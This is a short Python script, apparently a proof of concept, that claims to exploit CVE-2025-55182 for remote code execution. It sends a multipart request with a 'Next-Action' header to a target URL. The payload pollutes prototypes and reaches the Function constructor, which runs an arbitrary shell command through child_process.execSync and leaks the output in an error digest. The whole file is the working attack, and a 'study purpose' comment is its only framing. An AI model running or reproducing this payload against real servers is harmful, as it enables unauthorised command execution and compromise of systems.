# Remote Code Execution script to exploit CVE-2025-55182
# reference: https://github.com/msanft/CVE-2025-55182
# This is just for study purpose.
import requests
import sys
import json

# get arguments
# target url
BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
# executable to trigger
EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "id"


playload = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        # executable without output
        # "_prefix": f"process.mainModule.require('child_process').execSync('{EXECUTABLE}');",
        # executable with output
        "_prefix": f"var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

# post file
files = {
    "0": (None, json.dumps(playload)),
    "1": (None, '"$@0"'),
}

# post
headers = {"Next-Action": "x"}
res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
print(res.status_code)
print(res.text)